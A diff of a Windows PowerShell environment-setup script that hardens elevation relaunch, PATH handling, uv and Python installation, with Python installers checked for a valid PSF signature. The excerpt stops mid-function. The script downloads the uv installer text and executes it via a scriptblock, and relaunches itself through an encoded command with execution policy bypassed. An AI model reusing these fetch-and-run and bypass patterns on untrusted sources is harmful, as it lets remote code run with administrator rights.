@@ -4,6 +4,48 @@ param(
     [switch]$UpgradeUvTools
 )
 
+function ConvertTo-PowerShellSingleQuotedLiteral {
+    param(
+        [AllowEmptyString()]
+        [string]$Value
+    )
+
+    $quote = [string][char]39
+    $escapedValue = ([string]$Value).Replace($quote, ($quote + $quote))
+    return $quote + $escapedValue + $quote
+}
+
+function New-ElevatedRelaunchCommand {
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$ScriptPath,
+        [AllowEmptyString()]
+        [string]$WorkingDirectory,
+        [AllowEmptyString()]
+        [string]$UserSid,
+        [switch]$UpgradeTools,
+        [object[]]$AdditionalArguments
+    )
+
+    $commandParts = @(
+        '&', (ConvertTo-PowerShellSingleQuotedLiteral -Value $ScriptPath),
+        '-RelaunchWorkingDirectory', (ConvertTo-PowerShellSingleQuotedLiteral -Value $WorkingDirectory),
+        '-ExpectedUserSid', (ConvertTo-PowerShellSingleQuotedLiteral -Value $UserSid)
+    )
+
+    if ($UpgradeTools) {
+        $commandParts += '-UpgradeUvTools'
+    }
+
+    foreach ($argument in $AdditionalArguments) {
+        if ($null -ne $argument) {
+            $commandParts += (ConvertTo-PowerShellSingleQuotedLiteral -Value ([string]$argument))
+        }
+    }
+
+    $commandText = $commandParts -join ' '
+    return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandText))
+}
 $currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
 $currentUserSid = if ($currentIdentity.User) { $currentIdentity.User.Value } else { $null }
 if (-not $currentUserSid) {
@@ -15,25 +57,20 @@ if (-not ([Security.Principal.WindowsPrincipal]$currentIdentity).IsInRole([Secur
     $ExpectedUserSid = $currentUserSid
     $scriptPath = $PSCommandPath
     if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Definition }
+    if (-not $scriptPath -or -not (Test-Path -LiteralPath $scriptPath -PathType Leaf)) {
+        Write-Host '[ERROR] Unable to determine the setup script path for elevation.' -ForegroundColor Red
+        exit 1
+    }
+
+    $scriptPath = [System.IO.Path]::GetFullPath($scriptPath)
 
     $psExe = (Get-Process -Id $PID).Path
     if (-not $psExe) { $psExe = 'powershell.exe' }
 
-    $quote = { param($v) '"' + ($v -replace '"', '\"') + '"' }
-
     $workDir = if ($PWD.Path) { $PWD.Path } else { '' }
-    $relaunchArgs = @(
-        '-NoProfile', '-ExecutionPolicy', 'Bypass',
-        '-File', (& $quote $scriptPath),
-        '-RelaunchWorkingDirectory', (& $quote $workDir),
-        '-ExpectedUserSid', (& $quote $ExpectedUserSid)
-    )
-    if ($UpgradeUvTools) {
-        $relaunchArgs += '-UpgradeUvTools'
-    }
-    foreach ($a in $args) {
-        if ($null -ne $a) { $relaunchArgs += (& $quote $a) }
-    }
+    $encodedCommand = New-ElevatedRelaunchCommand -ScriptPath $scriptPath -WorkingDirectory $workDir `
+        -UserSid $ExpectedUserSid -UpgradeTools:$UpgradeUvTools -AdditionalArguments $args
+    $relaunchArgs = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', $encodedCommand)
 
     try {
         $elevated = Start-Process -FilePath $psExe -ArgumentList $relaunchArgs `
@@ -65,8 +102,6 @@ $PSDefaultParameterValues['*:Verbose'] = $false
 $PSDefaultParameterValues['*:Debug'] = $false
 
 $script:FailedSteps = New-Object System.Collections.Generic.List[string]
-$script:OriginalPath = $env:Path
-$script:NodeMinMajor = 18
 
 function Restore-Preferences {
     $PSDefaultParameterValues.Clear()
@@ -80,7 +115,7 @@ function Write-StepLog {
         [string]$Message
     )
     if ($Message) {
-        Write-Host "[STEP] $Message" -ForegroundColor Cyan
+        Write-Host ('[STEP] ' + $Message) -ForegroundColor Cyan
     }
 }
 
@@ -89,7 +124,7 @@ function Write-InfoLog {
         [string]$Message
     )
     if ($Message) {
-        Write-Host "[INFO] $Message" -ForegroundColor Gray
+        Write-Host ('[INFO] ' + $Message) -ForegroundColor Gray
     }
 }
 
@@ -98,7 +133,7 @@ function Write-WarnLog {
         [string]$Message
     )
     if ($Message) {
-        Write-Host "[WARN] $Message" -ForegroundColor Yellow
+        Write-Host ('[WARN] ' + $Message) -ForegroundColor Yellow
     }
 }
 
@@ -160,21 +195,80 @@ function Enable-ModernTls {
     }
 }
 
+function Get-NormalizedPathEntry {
+    param(
+        [AllowEmptyString()]
+        [string]$Path
+    )
+
+    $value = ([string]$Path).Trim()
+    $quoteCharacter = [string][char]34
+    $value = $value.Trim([char[]]$quoteCharacter)
+    if (-not $value) {
+        return ''
+    }
+
+    if ($value.Length -gt 3) {
+        $value = $value.TrimEnd([char[]]@('\', '/'))
+    }
+
+    return $value
+}
+
+function Get-UniquePathEntries {
+    param(
+        [string[]]$PathValues
+    )
+
+    $seen = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::OrdinalIgnoreCase)
+    $result = New-Object System.Collections.Generic.List[string]
+
+    foreach ($pathValue in @($PathValues)) {
+        foreach ($entry in ([string]$pathValue -split ';')) {
+            $normalizedEntry = Get-NormalizedPathEntry -Path $entry
+            if (-not $normalizedEntry) {
+                continue
+            }
+
+            if ($seen.Add($normalizedEntry)) {
+                [void]$result.Add($normalizedEntry)
+            }
+        }
+    }
+
+    return $result.ToArray()
+}
+
+function Test-PathEntryPresent {
+    param(
+        [AllowEmptyString()]
+        [string]$PathValue,
+        [string]$Dir
+    )
+
+    $targetEntry = Get-NormalizedPathEntry -Path $Dir
+    if (-not $targetEntry) {
+        return $false
+    }
+
+    foreach ($entry in ([string]$PathValue -split ';')) {
+        $normalizedEntry = Get-NormalizedPathEntry -Path $entry
+        if ($normalizedEntry -and [string]::Equals($normalizedEntry, $targetEntry, [System.StringComparison]::OrdinalIgnoreCase)) {
+            return $true
+        }
+    }
+
+    return $false
+}
+
 function Update-ProcessPath {
+    $currentPath = $env:Path
     $machinePath = [System.Environment]::GetEnvironmentVariable('Path', 'Machine')
     $userPath = [System.Environment]::GetEnvironmentVariable('Path', 'User')
-    $pathParts = @()
+    $pathEntries = @(Get-UniquePathEntries -PathValues @($currentPath, $machinePath, $userPath))
 
-    if ($machinePath) {
-        $pathParts += $machinePath
-    }
-
-    if ($userPath) {
-        $pathParts += $userPath
-    }
-
-    if ($pathParts.Count -gt 0) {
-        $env:Path = $pathParts -join ';'
+    if ($pathEntries.Count -gt 0) {
+        $env:Path = $pathEntries -join ';'
     }
 }
 
@@ -240,100 +334,61 @@ function Get-WebResponseContentText {
     return $scriptText
 }
 
-function Test-DirectoryWritable {
+function Get-UvToolBinDirectory {
     param(
-        [string]$Path
+        [string]$UvPath
     )
 
-    if (-not $Path -or -not (Test-Path -LiteralPath $Path -PathType Container)) {
-        return $false
+    if (-not $UvPath) {
+        return $null
     }
 
-    $probePath = Join-Path $Path ".path-write-test-$([guid]::NewGuid().ToString('N')).tmp"
     try {
-        Set-Content -LiteralPath $probePath -Value '' -Encoding ASCII -ErrorAction Stop
-        Remove-Item -LiteralPath $probePath -Force -ErrorAction SilentlyContinue
-        return $true
+        $binDirectory = (& $UvPath tool dir --bin 2>$null | Out-String).Trim()
+        if ($LASTEXITCODE -eq 0 -and $binDirectory -and (Test-Path -LiteralPath $binDirectory -PathType Container)) {
+            return $binDirectory
+        }
     } catch {
-        Remove-Item -LiteralPath $probePath -Force -ErrorAction SilentlyContinue
-        return $false
-    }
-}
-
-function Get-ExistingWritablePathDir {
-    $seen = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::OrdinalIgnoreCase)
-
-    foreach ($dir in ($script:OriginalPath -split ';')) {
-        if (-not $dir) {
-            continue
-        }
-
-        if (-not $seen.Add($dir)) {
-            continue
-        }
-
-        if (Test-DirectoryWritable -Path $dir) {
-            return $dir
-        }
     }
 
     return $null
 }
 
-function Bridge-CommandIntoCurrentPath {
+function Test-CommandBelongsToDirectory {
     param(
-        [string[]]$CommandNames
+        [string]$CommandPath,
+        [string]$Directory
     )
 
-    Update-ProcessPath
-    $sourcePath = Get-CommandPath -Names $CommandNames
-    if (-not $sourcePath) {
+    if (-not $CommandPath -or -not $Directory) {
         return $false
     }
 
-    $targetDir = Get-ExistingWritablePathDir
-    if (-not $targetDir) {
-        return $true
+    $commandDirectory = Split-Path -Parent $CommandPath
+    $normalizedCommandDirectory = Get-NormalizedPathEntry -Path $commandDirectory
+    $normalizedTargetDirectory = Get-NormalizedPathEntry -Path $Directory
+    if (-not $normalizedCommandDirectory -or -not $normalizedTargetDirectory) {
+        return $false
     }
 
-    $sourceDir = Split-Path $sourcePath -Parent
-    if ($sourceDir -and $sourceDir.TrimEnd('\') -ieq $targetDir.TrimEnd('\')) {
-        return $true
-    }
+    return [string]::Equals($normalizedCommandDirectory, $normalizedTargetDirectory, [System.StringComparison]::OrdinalIgnoreCase)
+}
 
-    $shimNames = @(
-        $CommandNames |
-            Where-Object { $_ -and ([System.IO.Path]::GetExtension($_) -eq '') } |
-            Select-Object -Unique
+function Bridge-CommandIntoCurrentPath {
+    param(
+        [string[]]$CommandNames,
+        [string]$UvPath
     )
-    if (-not $shimNames -or $shimNames.Count -eq 0) {
-        $shimNames = @([System.IO.Path]::GetFileNameWithoutExtension($sourcePath))
+
+    Update-ProcessPath
+    $uvBinDirectory = Get-UvToolBinDirectory -UvPath $UvPath
+    if ($uvBinDirectory) {
+        Add-ToPath -Dir $uvBinDirectory -Scope User
+        Update-ProcessPath
     }
 
-    $sourceExt = [System.IO.Path]::GetExtension($sourcePath)
-    foreach ($shimName in $shimNames) {
-        $shimPath = Join-Path $targetDir "$shimName.cmd"
-        if (Test-Path -LiteralPath $shimPath) {
-            $existingContent = Get-Content -LiteralPath $shimPath -Raw -ErrorAction SilentlyContinue
-            if ($existingContent -and $existingContent -notmatch 'uv-bridge-managed') {
-                continue
-            }
-        }
-
-        $shimContent = if ($sourceExt -ieq '.ps1') {
-            "@echo off`r`nREM uv-bridge-managed`r`npowershell -NoProfile -ExecutionPolicy Bypass -File `"$sourcePath`" %*`r`n"
-        } else {
-            "@echo off`r`nREM uv-bridge-managed`r`n`"$sourcePath`" %*`r`n"
-        }
-
-        try {
-            Set-Content -LiteralPath $shimPath -Value $shimContent -Encoding ASCII -ErrorAction Stop
-        } catch {
-            return $false
-        }
-    }
-
-    return $true
+    $commandPath = Get-CommandPath -Names $CommandNames
+    return (Test-CommandBelongsToDirectory -CommandPath $commandPath -Directory $uvBinDirectory)
 }
 
 function Test-StoreStub {
@@ -397,59 +452,138 @@ function Get-NormalizedCommandNames {
     return $normalizedNames.ToArray()
 }
 
-function Test-UvToolRegistered {
+function Test-UvToolListOutputContainsCommand {
     param(
+        [AllowEmptyString()]
+        [string]$OutputText,
         [string[]]$CommandNames
     )
 
-    $normalizedNames = Get-NormalizedCommandNames -CommandNames $CommandNames
-    if ($normalizedNames.Count -eq 0) {
+    $normalizedNames = @(Get-NormalizedCommandNames -CommandNames $CommandNames)
+    if ($normalizedNames.Count -eq 0 -or -not $OutputText) {
         return $false
     }
 
-    $toolRoots = @(
-        (Join-Path $env:APPDATA 'uv\tools'),
-        (Join-Path $env:LOCALAPPDATA 'uv\tools')
-    )
-
-    foreach ($toolRoot in $toolRoots) {
-        if (-not $toolRoot -or -not (Test-Path $toolRoot -PathType Container)) {
+    foreach ($line in ($OutputText -split '\r?\n')) {
+        $trimmedLine = $line.Trim()
+        if (-not $trimmedLine) {
             continue
         }
 
-        $toolDirs = Get-ChildItem -Path $toolRoot -Directory -ErrorAction SilentlyContinue
-        foreach ($toolDir in $toolDirs) {
-            $receiptPath = Join-Path $toolDir.FullName 'uv-receipt.toml'
-            if (-not (Test-Path $receiptPath -PathType Leaf)) {
-                continue
+        if ($trimmedLine -match '^-\s+(?<command>[^\s]+)') {
+            $candidateName = [System.IO.Path]::GetFileNameWithoutExtension($matches['command'])
+            if ($candidateName -and ($normalizedNames -contains $candidateName)) {
+                return $true
             }
+            continue
+        }
 
-            try {
-                $receiptContent = Get-Content -LiteralPath $receiptPath -Raw -ErrorAction Stop
-            } catch {
-                continue
-            }
+        if ($trimmedLine -match '^[A-Za-z]:\\') {
+            continue
+        }
 
-            foreach ($normalizedName in $normalizedNames) {
-                $entryPointPattern = 'name\s*=\s*"' + [regex]::Escape($normalizedName) + '"'
-                $installPathPattern = 'install-path\s*=\s*"[^"]*[\\/]' + [regex]::Escape($normalizedName) + '\.exe"'
-                if ($receiptContent -match $entryPointPattern -or $receiptContent -match $installPathPattern) {
-                    return $true
-                }
-            }
+        $headerToken = ($trimmedLine -split '\s+', 2)[0]
+        $candidateName = [System.IO.Path]::GetFileNameWithoutExtension($headerToken)
+        if ($candidateName -and ($normalizedNames -contains $candidateName)) {
+            return $true
         }
     }
 
     return $false
 }
 
+function Test-UvToolRegistered {
+    param(
+        [string]$UvPath,
+        [string[]]$CommandNames
+    )
+
+    if (-not $UvPath) {
+        return $false
+    }
+
+    try {
+        $toolListOutput = (& $UvPath tool list --show-paths 2>&1 | Out-String)
+        if ($LASTEXITCODE -ne 0) {
+            return $false
+        }
+
+        return Test-UvToolListOutputContainsCommand -OutputText $toolListOutput -CommandNames $CommandNames
+    } catch {
+        return $false
+    }
+}
+
+function Test-UvExecutable {
+    param(
+        [string]$UvPath
+    )
+
+    if (-not $UvPath -or -not (Test-Path -LiteralPath $UvPath -PathType Leaf)) {
+        return $false
+    }
+
+    try {
+        & $UvPath --version >$null 2>$null
+        return ($LASTEXITCODE -eq 0)
+    } catch {
+        return $false
+    }
+}
+
+function Get-KnownUvExecutablePaths {
+    $candidatePaths = New-Object System.Collections.Generic.List[string]
+    $seen = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::OrdinalIgnoreCase)
+
+    if ($env:UV_INSTALL_DIR) {
+        $uvInstallPath = if ([System.IO.Path]::GetExtension($env:UV_INSTALL_DIR) -ieq '.exe') {
+            $env:UV_INSTALL_DIR
+        } else {
+            Join-Path $env:UV_INSTALL_DIR 'uv.exe'
+        }
+        if ($seen.Add($uvInstallPath)) {
+            [void]$candidatePaths.Add($uvInstallPath)
+        }
+    }
+
+    if ($env:USERPROFILE) {
+        $defaultUvPath = Join-Path $env:USERPROFILE '.local\bin\uv.exe'
+        if ($seen.Add($defaultUvPath)) {
+            [void]$candidatePaths.Add($defaultUvPath)
+        }
+    }
+
+    return $candidatePaths.ToArray()
+}
+
+function Resolve-UvPath {
+    Update-ProcessPath
+
+    $uvPath = Get-CommandPath -Names @('uv')
+    if ($uvPath -and (Test-UvExecutable -UvPath $uvPath)) {
+        return $uvPath
+    }
+
+    $knownUvPaths = @(Get-KnownUvExecutablePaths)
+    foreach ($candidatePath in $knownUvPaths) {
+        if (-not (Test-UvExecutable -UvPath $candidatePath)) {
+            continue
+        }
+
+        Add-ToPath -Dir (Split-Path -Parent $candidatePath) -Scope User
+        Update-ProcessPath
+        return (Get-CommandPath -Names @('uv'))
+    }
+
+    return $null
+}
+
 function Install-Uv {
     Write-StepLog 'Checking uv (fast Python package manager)'
 
-    $uvPath = Get-CommandPath -Names @('uv')
+    $uvPath = Resolve-UvPath
     if ($uvPath) {
-        $version = & $uvPath --version 2>$null | Out-String
-        Write-InfoLog "uv already available: $($version.Trim())"
+        Write-InfoLog "uv already available: $uvPath"
         return $uvPath
     }
 
@@ -461,24 +595,38 @@ function Install-Uv {
         if ($installScript.StatusCode -eq 200 -and $installScript.Content) {
             $installScriptText = Get-WebResponseContentText -Response $installScript
             & ([scriptblock]::Create($installScriptText)) *> $null
-            Update-ProcessPath
-            $uvPath = Get-CommandPath -Names @('uv')
-            if ($uvPath) {
-                $uvBinDir = Join-Path $env:USERPROFILE '.local\bin'
-                if (Test-Path $uvBinDir) {
-                    Add-ToPath $uvBinDir
-                }
-                Write-InfoLog "uv installation completed: $uvPath"
-                return $uvPath
-            }
         }
+
+        $uvPath = Resolve-UvPath
+        if ($uvPath) {
+            Write-InfoLog "uv installation completed: $uvPath"
+            return $uvPath
+        }
+
+        Add-FailedStep -Step 'Install uv' -Reason 'uv-not-found-after-install'
     } catch {
-        Write-WarnLog "Failed to install uv"
+        Write-WarnLog 'Failed to install uv'
         Add-FailedStep -Step 'Install uv' -Reason (Get-ExceptionMessage -ErrorRecord $_)
-        return $null
     }
 
     return $null
+}
+
+function Test-PythonRuntimeVersion {
+    param(
+        [string]$PythonPath
+    )
+
+    if (-not $PythonPath) {
+        return $false
+    }
+
+    try {
+        & $PythonPath -c 'import sys; raise SystemExit(0 if sys.version_info >= (3, 10) else 1)' >$null 2>$null
+        return ($LASTEXITCODE -eq 0)
+    } catch {
+        return $false
+    }
 }
 
 function Resolve-PythonPath {
@@ -490,54 +638,77 @@ function Resolve-PythonPath {
         return $null
     }
 
-    try {
-        & $Candidate --version >$null 2>$null
-        if ($LASTEXITCODE -ne 0) {
-            return $null
-        }
-    } catch {
-        return $null
-    }
-
     $leafName = Split-Path $Candidate -Leaf
     if ($leafName -eq 'py.exe') {
         try {
-            $realExe = (& $Candidate -c "import sys; print(sys.executable)" 2>$null | Out-String).Trim()
-            if ($realExe -and (Test-Path $realExe)) {
+            $realExe = (& $Candidate -c 'import sys; print(sys.executable)' 2>$null | Out-String).Trim()
+            if ($realExe -and (Test-Path -LiteralPath $realExe -PathType Leaf) -and (Test-PythonRuntimeVersion -PythonPath $realExe)) {
                 return $realExe
             }
         } catch {
         }
+
+        return $null
     }
 
-    return $Candidate
-}
-function Get-PythonInstallerArch {
-    $arch = $env:PROCESSOR_ARCHITECTURE
-    if ($arch -eq 'ARM64') {
-        return 'arm64'
-    }
-    if ($arch -eq 'x86') {
-        return 'win32'
-    }
-    return 'amd64'
-}
-
-function Get-PreferredPythonInstallerUrl {
-    $installerArch = Get-PythonInstallerArch
-    if ($installerArch -eq 'amd64') {
-        return 'https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe'
+    if (Test-PythonRuntimeVersion -PythonPath $Candidate) {
+        return $Candidate
     }
 
     return $null
 }
 
-function Get-LatestPythonInstallerUrl {
+function Get-PythonInstallerArch {
+    $arch = $env:PROCESSOR_ARCHITEW6432
+    if (-not $arch) {
+        $arch = $env:PROCESSOR_ARCHITECTURE
+    }
+
+    if (-not $arch) {
+        try {
+            $arch = [System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture.ToString()
+        } catch {
+        }
+    }
+
+    switch (([string]$arch).ToUpperInvariant()) {
+        'ARM64' { return 'arm64' }
+        'X86' { return 'x86' }
+        'AMD64' { return 'amd64' }
+        'X64' { return 'amd64' }
+        default { throw "Unsupported processor architecture: $arch" }
+    }
+}
+
+function Get-PythonInstallerArchSuffix {
+    param(
+        [string]$InstallerArch
+    )
+
+    if ($InstallerArch -eq 'x86') {
+        return ''
+    }
+
+    return "-$InstallerArch"
+}
+
+function Get-PythonInstallerUrlPattern {
+    param(
+        [string]$InstallerArch
+    )
+
+    $archSuffix = Get-PythonInstallerArchSuffix -InstallerArch $InstallerArch
+    return '(https://www\.python\.org)?/ftp/python/[^<\s]+/python-[0-9.]+' + [regex]::Escape($archSuffix) + '\.exe'
+}
+
+function Get-LatestPythonInstallerUrls {
     $installerArch = Get-PythonInstallerArch
     $pageUrls = @(
         'https://www.python.org/downloads/latest/',
         'https://www.python.org/downloads/windows/'
     )
+    $installerUrls = New-Object System.Collections.Generic.List[string]
+    $seenUrls = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::OrdinalIgnoreCase)
 
     Enable-ModernTls
 
@@ -548,50 +719,71 @@ function Get-LatestPythonInstallerUrl {
                 continue
             }
 
-            # Use a dedicated variable name to avoid clobbering automatic variable $matches.
-            $pythonMatches = [regex]::Matches($response.Content, "(https://www\.python\.org)?/ftp/python/[^`"'<>\s]+/python-[0-9.]+-$installerArch\.exe")
-            foreach ($match in $pythonMatches) {
+            $pythonPattern = Get-PythonInstallerUrlPattern -InstallerArch $installerArch
+            foreach ($match in [regex]::Matches($response.Content, $pythonPattern)) {
                 $url = $match.Value
                 if ($url -notmatch '^https://') {
-                    $url = "https://www.python.org$url"
+                    $url = 'https://www.python.org' + $url
                 }
 
-                return $url
+                if ($seenUrls.Add($url)) {
+                    [void]$installerUrls.Add($url)
+                }
             }
         } catch {
         }
     }
 
-    return "https://www.python.org/ftp/python/3.13.3/python-3.13.3-$installerArch.exe"
+    return $installerUrls.ToArray()
 }
 
-# Ensure a directory is in Machine PATH (registry) and current process PATH.
 function Add-ToPath {
     param(
-        [string]$Dir
+        [string]$Dir,
+        [ValidateSet('User', 'Machine')]
+        [string]$Scope = 'User'
     )
 
-    if (-not $Dir -or -not (Test-Path $Dir)) {
+    if (-not $Dir -or -not (Test-Path -LiteralPath $Dir -PathType Container)) {
         return
     }
 
-    $machinePath = [System.Environment]::GetEnvironmentVariable('Path', 'Machine')
-    if (-not $machinePath -or $machinePath -notlike "*$Dir*") {
-        $newPath = if ($machinePath) { "$machinePath;$Dir" } else { $Dir }
-        [System.Environment]::SetEnvironmentVariable('Path', $newPath, 'Machine')
+    $resolvedDirectory = [System.IO.Path]::GetFullPath($Dir)
+    $persistentPath = [System.Environment]::GetEnvironmentVariable('Path', $Scope)
+
+    if (-not (Test-PathEntryPresent -PathValue $persistentPath -Dir $resolvedDirectory)) {
+        $newPathEntries = @(Get-UniquePathEntries -PathValues @($persistentPath, $resolvedDirectory))
+        [System.Environment]::SetEnvironmentVariable('Path', ($newPathEntries -join ';'), $Scope)
     }
 
-    if ($env:Path -notlike "*$Dir*") {
-        $env:Path = "$Dir;$env:Path"
+    $env:Path = (@(Get-UniquePathEntries -PathValues @($resolvedDirectory, $env:Path)) -join ';')
+    Update-ProcessPath
+}
+
+function Test-PythonInstallerSignature {
+    param(
+        [string]$InstallerPath
+    )
+
+    if (-not $InstallerPath -or -not (Test-Path -LiteralPath $InstallerPath -PathType Leaf)) {
+        return $false
+    }
+
+    try {
+        $signature = Get-AuthenticodeSignature -FilePath $InstallerPath -ErrorAction Stop
+        if ($signature.Status -ne 'Valid' -or -not $signature.SignerCertificate) {
+            return $false
+        }
+
+        return ($signature.SignerCertificate.Subject -match 'Python Software Foundation')
+    } catch {
+        return $false
     }
 }
 
-# Make sure Python is available. If it is missing, download and install it
-# quietly, then refresh PATH for the current process.
 function Install-Python {
     Write-StepLog 'Checking Python runtime'
 
-    # Try to find a working Python, skipping Store stubs
     foreach ($name in @('python', 'py')) {
         $candidate = Get-CommandPath -Names @($name)
         $resolved = Resolve-PythonPath $candidate
@@ -601,262 +793,46 @@ function Install-Python {
         }
     }
 
-    $installerPath = Join-Path $env:TEMP 'python-installer.exe'
-    $installerUrls = New-Object System.Collections.Generic.List[string]
-    $preferredPythonUrl = Get-PreferredPythonInstallerUrl
-
-    if ($preferredPythonUrl) {
-        [void]$installerUrls.Add($preferredPythonUrl)
+    $installerUrls = @(Get-LatestPythonInstallerUrls)
+    if ($installerUrls.Count -eq 0) {
+        Add-FailedStep -Step 'Install Python' -Reason 'installer-url-not-found'
+        return $null
     }
 
-    $fallbackPythonUrl = Get-LatestPythonInstallerUrl
-    if ($fallbackPythonUrl -and -not $installerUrls.Contains($fallbackPythonUrl)) {
-        [void]$installerUrls.Add($fallbackPythonUrl)
-    }
-
+    $attemptFailures = New-Object System.Collections.Generic.List[string]
     foreach ($pythonUrl in $installerUrls) {
         Write-InfoLog "Python was not found. Downloading installer from: $pythonUrl"
+        $installerPath = Join-Path ([System.IO.Path]::GetTempPath()) ('python-installer-' + [guid]::NewGuid().ToString('N') + '.exe')
 
         try {
             Enable-ModernTls
             Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath -ErrorAction Stop
+            if (-not (Test-PythonInstallerSignature -InstallerPath $installerPath)) {
+                throw 'installer signature validation failed'
+            }
+
             $process = Start-Process -FilePath $installerPath -ArgumentList @('/quiet', 'InstallAllUsers=1', 'PrependPath=1', 'Include_launcher=1') -Wait -PassThru -WindowStyle Hidden
-            if ($process.ExitCode -eq 0) {
-                Update-ProcessPath
-                foreach ($name in @('python', 'py')) {
-                    $candidate = Get-CommandPath -Names @($name)
-                    $resolved = Resolve-PythonPath $candidate
-                    if ($resolved) {
-                        Write-InfoLog "Python installation completed: $resolved"
-                        return $resolved
-                    }
+            $exitCode = if ($null -ne $process.ExitCode) { $process.ExitCode } else { 'unknown' }
+
+            Update-ProcessPath
+            foreach ($name in @('python', 'py')) {
+                $candidate = Get-CommandPath -Names @($name)
+                $resolved = Resolve-PythonPath $candidate
+                if ($resolved) {
+                    Write-InfoLog "Python installation completed: $resolved"
+                    return $resolved
                 }
             }
 
-            Write-WarnLog "Python installer finished with exit code $($process.ExitCode), but Python is still unavailable."
-            Add-FailedStep -Step 'Install Python' -Reason "exit=$($process.ExitCode)"
+            [void]$attemptFailures.Add("$pythonUrl (exit=$exitCode)")
         } catch {
-            Write-ContinueOnError -Step 'Install Python' -Action 'install Python' -ErrorRecord $_
+            [void]$attemptFailures.Add("$pythonUrl ($(Get-ExceptionMessage -ErrorRecord $_))")
         } finally {
             Remove-Item -LiteralPath $installerPath -Force -ErrorAction SilentlyContinue
         }
     }
 
-    return $null
-}
-
-function Get-NodeInstallerArch {
-    $arch = $env:PROCESSOR_ARCHITECTURE
-    if ($arch -eq 'ARM64') {
-        return 'arm64'
-    }
-    if ($arch -eq 'x86') {
-        return 'x86'
-    }
-    return 'x64'
-}
-
-# Node.js publishes releases per version directory plus a "latest" alias.
-# Prefer the newest LTS line, then fall back to the latest release.
-function Get-NodeReleaseRefs {
-    $releaseRefs = New-Object System.Collections.Generic.List[string]
-
-    try {
-        Enable-ModernTls
-        $response = Invoke-WebRequest -Uri 'https://nodejs.org/dist/index.json' -UseBasicParsing -ErrorAction Stop
-        $indexText = Get-WebResponseContentText -Response $response
-        if ($indexText) {
-            $releases = ConvertFrom-Json -InputObject $indexText
-            $ltsRelease = $releases | Where-Object { $_.lts } | Select-Object -First 1
-            if ($ltsRelease -and $ltsRelease.version) {
-                [void]$releaseRefs.Add($ltsRelease.version)
-            }
-        }
-    } catch {
-    }
-
-    [void]$releaseRefs.Add('latest')
-    return $releaseRefs.ToArray()
-}
-
-function Get-NodeInstallerUrl {
-    param(
-        [string]$PackageType
-    )
-
-    $installerArch = Get-NodeInstallerArch
-    if ($PackageType -eq 'msi') {
-        $filePattern = "node-v[0-9]+\.[0-9]+\.[0-9]+-$installerArch\.msi"
-    } else {
-        $filePattern = "node-v[0-9]+\.[0-9]+\.[0-9]+-win-$installerArch\.zip"
-    }
-
-    foreach ($releaseRef in (Get-NodeReleaseRefs)) {
-        Enable-ModernTls
-        try {
-            $response = Invoke-WebRequest -Uri "https://nodejs.org/dist/$releaseRef/" -UseBasicParsing -ErrorAction Stop
-            $listingText = Get-WebResponseContentText -Response $response
-            if (-not $listingText) {
-                continue
-            }
-
-            $fileMatches = [regex]::Matches($listingText, $filePattern)
-            foreach ($fileMatch in $fileMatches) {
-                return "https://nodejs.org/dist/$releaseRef/$($fileMatch.Value)"
-            }
-        } catch {
-        }
-    }
-
-    return $null
-}
-
-function Get-NodeMajorVersion {
-    param(
-        [string]$NodePath
-    )
-
-    if (-not $NodePath) {
-        return $null
-    }
-
-    try {
-        $rawVersion = (& $NodePath -v 2>$null | Out-String).Trim()
-    } catch {
-        return $null
-    }
-
-    $versionMatch = [regex]::Match($rawVersion, '^v?(\d+)')
-    if (-not $versionMatch.Success) {
-        return $null
-    }
-
-    return [int]$versionMatch.Groups[1].Value
-}
-
-function Test-NodeRuntime {
-    $nodePath = Get-CommandPath -Names @('node.exe', 'node')
-    if (-not $nodePath) {
-        return $false
-    }
-
-    $npmPath = Get-CommandPath -Names @('npm.cmd', 'npm')
-    if (-not $npmPath) {
-        return $false
-    }
-
-    $majorVersion = Get-NodeMajorVersion -NodePath $nodePath
-    if ($null -eq $majorVersion) {
-        return $false
-    }
-
-    return ($majorVersion -ge $script:NodeMinMajor)
-}
-
-function Install-NodeFromZip {
-    param(
-        [string]$ZipUrl
-    )
-
-    $installerArch = Get-NodeInstallerArch
-    $zipPath = Join-Path $env:TEMP "node-$installerArch.zip"
-    $extractRoot = Join-Path $env:TEMP "node-$installerArch"
-    $nodeDir = Join-Path $env:ProgramFiles 'nodejs'
-
-    try {
-        Enable-ModernTls
-        Invoke-WebRequest -Uri $ZipUrl -OutFile $zipPath -ErrorAction Stop
-
-        Remove-Item -LiteralPath $extractRoot -Recurse -Force -ErrorAction SilentlyContinue
-        Expand-Archive -LiteralPath $zipPath -DestinationPath $extractRoot -Force
-
-        $extractedDirs = @(Get-ChildItem -Path $extractRoot -Directory -ErrorAction SilentlyContinue)
-        if ($extractedDirs.Count -eq 0) {
-            throw "Node.js archive '$ZipUrl' did not contain a version directory."
-        }
-
-        New-Item -ItemType Directory -Path $nodeDir -Force | Out-Null
-        Copy-Item -Path (Join-Path $extractedDirs[0].FullName '*') -Destination $nodeDir -Recurse -Force
-        Remove-Item -LiteralPath $extractRoot -Recurse -Force -ErrorAction SilentlyContinue
-
-        Add-ToPath $nodeDir
-        Update-ProcessPath
-    } catch {
-        Write-ContinueOnError -Step 'Install Node.js' -Action 'install Node.js from zip archive' -ErrorRecord $_
-    } finally {
-        Remove-Item -LiteralPath $zipPath -Force -ErrorAction SilentlyContinue
-    }
-}
-
-# Make sure Node.js (and npm) are available. If Node.js is missing or too old,
-# install the official LTS build quietly, then refresh PATH for this process.
-function Install-NodeJs {
-    Write-StepLog 'Checking Node.js runtime'
-
-    $nodePath = Get-CommandPath -Names @('node.exe', 'node')
-
-    if (Test-NodeRuntime) {
-        Write-InfoLog "Node.js already available: $nodePath"
-        return $nodePath
-    }
-
-    $installerArch = Get-NodeInstallerArch
-    $msiPath = Join-Path $env:TEMP "node-installer-$installerArch.msi"
-    $installerUrls = New-Object System.Collections.Generic.List[string]
-
